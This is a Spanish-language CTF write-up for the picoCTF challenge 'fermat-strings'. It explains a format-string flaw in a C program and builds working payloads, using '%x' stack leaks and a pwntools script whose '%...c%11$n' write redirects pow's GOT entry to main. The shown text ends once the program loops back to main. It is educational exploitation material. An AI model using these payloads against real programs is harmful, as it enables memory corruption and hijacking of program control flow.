<!doctype html><html lang=es>
<head>
<title>fermat-strings | 7Rocky</title>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<meta name=viewport content="width=device-width,minimum-scale=1">
<meta name=description content="Se nos proporciona un binario de 64 bits llamado chall:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)  Tenemos también el código fuente en C. Básicamente, lo que hace el programa es pedir dos números y tratar de buscar uno que rompa el Último Teorema de Fermat.
Como recordatorio, el Último Teorema de Fermat dice que no existen números positivos $a$, $b$, $c$ que cumplan la ecuación:">
<meta name=robots content="index, follow">
<meta name=image content="https://7rocky.github.io/images/pwn.png">
<meta name=author content="7Rocky">
<meta property="og:title" content="fermat-strings">
<meta property="og:description" content="Se nos proporciona un binario de 64 bits llamado chall:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)  Tenemos también el código fuente en C. Básicamente, lo que hace el programa es pedir dos números y tratar de buscar uno que rompa el Último Teorema de Fermat.
Como recordatorio, el Último Teorema de Fermat dice que no existen números positivos $a$, $b$, $c$ que cumplan la ecuación:">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7rocky.github.io/ctf/picoctf/binary-exploitation/fermat-strings/"><meta property="article:section" content="ctf">
<meta property="article:modified_time" content="2022-01-25T02:00:49+01:00"><meta property="og:site_name" content="7Rocky">
<meta property="og:image" content="https://7rocky.github.io/images/pwn.png">
<meta property="og:author" content="7Rocky">
<meta itemprop=name content="fermat-strings">
<meta itemprop=description content="Se nos proporciona un binario de 64 bits llamado chall:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)  Tenemos también el código fuente en C. Básicamente, lo que hace el programa es pedir dos números y tratar de buscar uno que rompa el Último Teorema de Fermat.
Como recordatorio, el Último Teorema de Fermat dice que no existen números positivos $a$, $b$, $c$ que cumplan la ecuación:">
<meta itemprop=dateModified content="2022-01-25T02:00:49+01:00">
<meta itemprop=wordCount content="2449">
<meta itemprop=keywords content>
<meta name=twitter:card content="summary">
<meta name=twitter:title content="fermat-strings">
<meta name=twitter:description content="Se nos proporciona un binario de 64 bits llamado chall:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)  Tenemos también el código fuente en C. Básicamente, lo que hace el programa es pedir dos números y tratar de buscar uno que rompa el Último Teorema de Fermat.
Como recordatorio, el Último Teorema de Fermat dice que no existen números positivos $a$, $b$, $c$ que cumplan la ecuación:">
<meta name=twitter:image content="https://7rocky.github.io/images/pwn.png">
<meta name=twitter:author content="7Rocky">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-Z1HQGH3M4D',{anonymize_ip:!1})}</script>
<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
<link href=/css/style.css rel=stylesheet>
<link href=/css/monokai-sublime.min.css rel=stylesheet>
<link href=/css/code.css rel=stylesheet>
<link href=/css/main.css rel=stylesheet>
<script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
<script src=/js/main.js></script>
<div style=display:none>
$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$
</div>
</head>
<body class="ma0 production">
<header>
<div class=bg-black>
<nav class="pv3 ph3 ph4-ns" role=navigation>
<div class="flex-l justify-between items-center center">
<a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a>
<div class="flex-l items-center">
<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/en/ctf/picoctf/binary-exploitation/fermat-strings/ title=en>
<img alt=en height=32px src=/images/en.png width=32px>
</a>
<ul class="pl0 ml3 mr3">
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a>
</li>
</ul>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div>
</div>
</nav>
</div>
</header>
<main class=pb7 role=main>
<article class="flex-l flex-wrap justify-between mw8 center ph3">
<header class="mt4 w-100">
<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">EXPLOTACIÓN DE BINARIOS</aside>
<div id=sharing class=mt3>
<a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/picoctf/binary-exploitation/fermat-strings/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a>
<a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/picoctf/binary-exploitation/fermat-strings/&text=fermat-strings" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
<a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/ctf/picoctf/binary-exploitation/fermat-strings/&title=fermat-strings" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
</div>
<h1 class="f1 mt3 mb1">fermat-strings</h1>
<br>
</header>
<div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un binario de 64 bits llamado <code>chall</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>Arch:     amd64-64-little
RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
Stack:    <span class=code-dark-green>Canary found</span>
NX:       <span class=code-dark-green>NX enabled</span>
PIE:      <span class=code-dark-red>No PIE (0x400000)</span>
</code></pre></div>
<p>Tenemos también el código fuente en C. Básicamente, lo que hace el programa es pedir dos números y tratar de buscar uno que rompa el Último Teorema de Fermat.</p>
<p>Como recordatorio, el Último Teorema de Fermat dice que no existen números positivos $a$, $b$, $c$ que cumplan la ecuación:</p>
<p>$$
a ^ n + b ^ n = z ^ n
$$</p>
<p>Para $n > 2$.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;math.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#75715e>#define SIZE 0x100
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>) {
  <span style=color:#66d9ef>char</span> A[SIZE];
  <span style=color:#66d9ef>char</span> B[SIZE];

  <span style=color:#66d9ef>int</span> a <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
  <span style=color:#66d9ef>int</span> b <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;

  puts(<span style=color:#e6db74>&#34;Welcome to Fermat</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#39;s Last Theorem as a service&#34;</span>);

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  printf(<span style=color:#e6db74>&#34;A: &#34;</span>);
  read(<span style=color:#ae81ff>0</span>, A, SIZE);
  printf(<span style=color:#e6db74>&#34;B: &#34;</span>);
  read(<span style=color:#ae81ff>0</span>, B, SIZE);

  A[strcspn(A, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
  B[strcspn(B, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;

  a <span style=color:#f92672>=</span> atoi(A);
  b <span style=color:#f92672>=</span> atoi(B);

  <span style=color:#66d9ef>if</span> (a <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> b <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
    puts(<span style=color:#e6db74>&#34;Error: could not parse numbers!&#34;</span>);
    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
  }

  <span style=color:#66d9ef>char</span> buffer[SIZE];
  snprintf(buffer, SIZE, <span style=color:#e6db74>&#34;Calculating for A: %s and B: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, A, B);
  printf(buffer);

  <span style=color:#66d9ef>int</span> answer <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>100</span>; i<span style=color:#f92672>++</span>) {
    <span style=color:#66d9ef>if</span> (pow(a, <span style=color:#ae81ff>3</span>) <span style=color:#f92672>+</span> pow(b, <span style=color:#ae81ff>3</span>) <span style=color:#f92672>==</span> pow(i, <span style=color:#ae81ff>3</span>)) {
      answer <span style=color:#f92672>=</span> i;
    }
  }

  <span style=color:#66d9ef>if</span> (answer <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) printf(<span style=color:#e6db74>&#34;Found the answer: %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, answer);
}
</code></pre></div><p>En el código fuente vemos una vulnerabilidad de <em>Format String</em>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-c data-lang=c>snprintf(buffer, SIZE, <span style=color:#e6db74>&#34;Calculating for A: %s and B: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, A, B);
printf(buffer);
</code></pre></div><p>Ya que podemos incluir formatos en la variable <code>buffer</code>, que es el primer argumento de <code>printf</code>. Sin embargo, necesitamos insertar un número válido en <code>A</code> y <code>B</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-c data-lang=c>printf(<span style=color:#e6db74>&#34;A: &#34;</span>);
read(<span style=color:#ae81ff>0</span>, A, SIZE);
printf(<span style=color:#e6db74>&#34;B: &#34;</span>);
read(<span style=color:#ae81ff>0</span>, B, SIZE);

A[strcspn(A, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
B[strcspn(B, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;

a <span style=color:#f92672>=</span> atoi(A);
b <span style=color:#f92672>=</span> atoi(B);
</code></pre></div><p>Pero esto es fácil. Vamos a probar:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./chall</span>
Welcome to Fermat\'s Last Theorem as a service
A: 1.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
B: 1
Calculating for A: 1.400bd8.97161728.0.ffffffff.97161350.0.0.97161580.1.78252e31.252e7825.2e78252e.78252e78.252e7825 and B: 1
</code></pre></div>
<p>Como podemos ver, estamos extrayendo valores de la pila (<em>stack</em>). Y también vemos que la cadena de formatos comienza en la posición 10 (<em>offset</em> 10):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./chall</span>
Welcome to Fermat\'s Last Theorem as a service
A: 1AAA%10$x
B: 1
Calculating for A: 1AAA41414131 and B: 1
</code></pre></div>
<p>El programa termina después de introducir los datos. Necesitamos encontrar una manera de ejecutar el programa de nuevo pero sin parar el proceso. Esto se puede hacer explotando la vulnerabilidad de <em>Format String</em>, ya que existe un formato <code>%n</code> que permite escribir el número de bytes escritos hasta el formato <code>%n</code> en la dirección dada como parámetro (el valor de la posición en la pila).</p>
<p>Vemos que el binario tiene la protección <em>Partial</em> RELRO, lo que indica que la GOT no se puede sobreescribir durante un <em>Buffer Overflow</em>, pero sí que se puede escribir con <em>Format String</em>. Por tanto, la idea es modificar una entrada de la GOT para que una función apunte a la dirección del &lsquo;<code>main</code> y así volver a ejecutar el programa.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q chall
Reading symbols from <span class=code-dark-green>chall</span>...
(No debugging symbols found in <span class=code-dark-green>chall</span>)
<span class=code-red>gef➤</span>  break main
Breakpoint 1 at <span class=code-dark-blue>0x40083b</span>
<span class=code-red>gef➤</span>  run
Starting program: ./chall

Breakpoint 1, <span class=code-dark-blue>0x000000000040083b</span> in <span class=code-dark-yellow>main</span> ()
</code></pre></div>
<p>Ahora podemos ver las entradas de la GOT:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  got

GOT protection: Partial RelRO | GOT functions: 9

[0x601018] <span class=code-dark-yellow>puts@GLIBC_2.2.5  →  0x4006c6</span>
[0x601020] <span class=code-dark-yellow>__stack_chk_fail@GLIBC_2.4  →  0x4006d6</span>
[0x601028] <span class=code-dark-yellow>setbuf@GLIBC_2.2.5  →  0x4006e6</span>
[0x601030] <span class=code-dark-yellow>printf@GLIBC_2.2.5  →  0x4006f6</span>
[0x601038] <span class=code-dark-yellow>snprintf@GLIBC_2.2.5  →  0x400706</span>
[0x601040] <span class=code-dark-yellow>pow@GLIBC_2.2.5  →  0x400716</span>
[0x601048] <span class=code-dark-yellow>strcspn@GLIBC_2.2.5  →  0x400726</span>
[0x601050] <span class=code-dark-yellow>read@GLIBC_2.2.5  →  0x400736</span>
[0x601058] <span class=code-dark-yellow>atoi@GLIBC_2.2.5  →  0x400746</span>
</code></pre></div>
<p>Desde el punto donde está la vulnerabilidad de <code>printf</code>, solamente se llama a <code>pow</code> y a <code>printf</code>. No nos interesa cambiar <code>printf</code>, por lo que habrá que modificar la entrada de <code>pow</code>.</p>
<p>Primero, vamos a poner la dirección en una posición de la pila. Para ello, utilizamos la variable <code>A</code> para poner la dirección y la variable <code>B</code> para extraerla. Pero antes, vamos a hacerlo con caracteres reconocibles:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./chall</span>
Welcome to Fermat\'s Last Theorem as a service
A: 1234567.AAAABBBB
B: 1.%11$lx
Calculating for A: 1234567.AAAABBBB and B: 1.4242424241414141
</code></pre></div>
<p>Nótese el uso de <code>%lx</code> para imprimir un valor de 8 bytes, y la posición 11, porque en la posición 10 tenemos <code>1234567.</code>.</p>
<p>Ahora, podemos reemplazar <code>AAAABBBB</code> con la dirección de <code>pow</code> en la GOT. Y en lugar de poner <code>%11$lx</code>, pondremos <code>%11$n</code>. Vamos a hacerlo en un script en Python con <code>pwntools</code> y adjuntar GDB para visualizar las entradas de la GOT:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python>payload_a <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1234567.&#39;</span> <span style=color:#f92672>+</span> p64(pow_got)
payload_b <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1.%11$n&#39;</span>

gdb<span style=color:#f92672>.</span>attach(p, gdbscript<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;break pow</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>continue</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>got&#39;</span>)

p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A: &#39;</span>, payload_a)
p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: &#39;</span>, payload_b)

p<span style=color:#f92672>.</span>interactive()
</code></pre></div><p>Si ejecutamos el <em>script</em>, GDB toma el proceso, se para en <code>pow</code> y muestra la GOT:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>GOT protection: Partial RelRO | GOT functions: 9

[0x601018] <span class=code-dark-green>puts@GLIBC_2.2.5  →  0x7f4c7b0845a0</span>
[0x601020] <span class=code-dark-yellow>__stack_chk_fail@GLIBC_2.4  →  0x4006d6</span>
[0x601028] <span class=code-dark-green>setbuf@GLIBC_2.2.5  →  0x7f4c7b08bc50</span>
[0x601030] <span class=code-dark-green>printf@GLIBC_2.2.5  →  0x7f4c7b061e10</span>
[0x601038] <span class=code-dark-green>snprintf@GLIBC_2.2.5  →  0x7f4c7b061ee0</span>
[0x601040] <span class=code-dark-green>pow@GLIBC_2.2.5  →  0x28</span>
[0x601048] <span class=code-dark-green>strcspn@GLIBC_2.2.5  →  0x7f4c7b1837b0</span>
[0x601050] <span class=code-dark-green>read@GLIBC_2.2.5  →  0x7f4c7b10e130</span>
[0x601058] <span class=code-dark-green>atoi@GLIBC_2.2.5  →  0x7f4c7b044730</span>
</code></pre></div>
<p>La entrada de <code>pow</code> se ha cambiado a <code>0x28</code> (40). Esto significa que hasta <code>$11$n</code> se han impreso 40 bytes. Como hemos puesto <code>1.</code> antes de <code>%11$n</code>, hay 38 bytes en la pila antes. Si ponemos <code>1..</code>, la entrada de la GOT cambiaría a <code>0x29</code> y sucesivamente.</p>
<p>En este momento, necesitamos introducir la dirección del <code>main</code> (<code>0x400837</code>, que es 4196407 en decimal) en la entrada de la GOT. Sin embargo, no podemos introducir tantos caracteres porque son demasiados.</p>
<p>Pero podemos utilizar otro formato. Como la dirección que necesitamos escribir es 4196407, entonces necesitamos que se impriman 4196407 - 38 - 2 = 4196367 bytes. Y esto se puede hacer con un formato como <code>%4196367c</code>.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python>pow_got <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x601040</span>
payload_a <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1234567.&#39;</span> <span style=color:#f92672>+</span> p64(pow_got)
payload_b <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1.</span><span style=color:#e6db74>%4196367c</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%11$n&#39;</span>

p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A: &#39;</span>, payload_a)
p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: &#39;</span>, payload_b)

p<span style=color:#f92672>.</span>interactive()
</code></pre></div><p>El cálculo del número de bytes a imprimir se puede realizar así también:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python>pow_got <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x601040</span>
bytes_on_stack <span style=color:#f92672>=</span> <span style=color:#ae81ff>38</span>
bytes_to_print <span style=color:#f92672>=</span> main_addr <span style=color:#f92672>-</span> bytes_on_stack <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span>

payload_a <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1234567.&#39;</span> <span style=color:#f92672>+</span> p64(pow_got)
payload_b <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;1.%</span><span style=color:#e6db74>{</span>bytes_to_print<span style=color:#e6db74>}</span><span style=color:#e6db74>c&#39;</span><span style=color:#f92672>.</span>encode() <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%11$n&#39;</span>
</code></pre></div><p>Y funciona, hemos convertido <code>pow</code> en <code>main</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py
[<span class=code-green>+</span>] Starting local process './chall': pid 389440
[<span class=code-blue>*</span>] Switching to interactive mode
Welcome to Fermat\'s Last Theorem as a service
A: <span class=code-red>$</span> 1
B: <span class=code-red>$</span> 1
Calculating for A: 1 and B: 1
Welcome to Fermat\'s Last Theorem as a service
A: <span class=code-red>$</span> 1
B: <span class=code-red>$</span> 1
